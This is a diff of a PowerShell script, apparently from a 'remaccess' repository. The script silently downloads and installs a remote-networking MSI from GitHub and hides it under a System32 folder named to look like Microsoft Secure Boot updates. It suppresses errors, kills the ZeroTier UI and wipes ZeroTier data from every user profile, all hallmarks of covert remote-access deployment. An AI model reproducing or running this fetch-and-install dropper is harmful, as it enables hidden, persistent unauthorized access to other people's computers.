@@ -1,20 +1,30 @@
 $ErrorActionPreference = "SilentlyContinue"
 $downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/MeshNetwork.msi"
+$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
 $downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
+$allUserProfiles = Get-WmiObject Win32_UserProfile | Where-Object { $_.Special -eq $false }
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
-$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
-$ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
-#Code starts Here
-New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowOff" -ItemType Directory -Force | Out-Null
+##Code starts Here
+#Cleanup
 Install-PackageProvider -Name NuGet -Force | Out-Null
 Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
-if (Test-Path $ztdatadir) {
-Remove-Item -Path $ztdatadir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
-}
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
 }
+foreach ($userProfile in $allUserProfiles) {
+    $profilePath = $userProfile.LocalPath
+    $username = $userProfile.LocalPath.Split('\')[-1]
+    if ($username -ne "SYSTEM" -and $username -ne "NT AUTHORITY") {
+        if (Test-Path -Path $profilePath) {
+            $zeroTierPath = Join-Path -Path $profilePath -ChildPath "AppData\Local\ZeroTier"
+            if (Test-Path -Path $zeroTierPath -PathType Container) {
+                Remove-Item -Path $zeroTierPath -Recurse -Force
+            }
+        }
+    }
+}
+#File integrity check
 if (Test-Path $destinationPath) {
     $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
     $hashesData = (iwr -Uri $hashesUrl -UseBasicParsing).Content
@@ -31,6 +41,7 @@ if (Test-Path $destinationPath) {
 if (-not (Test-Path $destinationPath)) {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
 }
+#Installation
 Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$destinationPath`" /qn /norestart"
 Timeout /NoBreak 20
 Stop-Process -Name zerotier_desktop_ui -F -ErrorAction SilentlyContinue | Out-Null
